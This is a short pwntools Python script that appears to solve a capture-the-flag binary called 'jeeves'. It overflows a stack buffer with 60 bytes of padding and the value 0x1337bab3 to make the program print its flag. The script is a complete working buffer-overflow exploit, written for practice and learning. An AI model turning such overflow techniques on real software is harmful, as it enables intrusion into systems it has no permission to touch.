from pwn import *


def find_eip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('Hello, good sir!', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    eip_offset = cyclic_find(p.corefile.rbp)
    info('located EIP offset at {a}'.format(a=eip_offset))
    # Return the EIP offset
    return eip_offset


# Set up pwntools for the correct architecture
exe = './jeeves'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# TODO: Try and get this working so that we can automate retrieval of 60 byte offset (rbp - 4)
# offset = find_eip(cyclic(100))

# Start program
io = process()
# io = remote('server', 1337)

# Build the payload
payload = flat(
    {60: 0x1337bab3}
)

# gdb.attach(io, gdbscript='''
# init-pwndbg
# ''')

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter('Hello, good sir!', payload)
io.recvuntil("Here's a small gift:")

# Get our flag!
flag = io.recv()
success(flag)
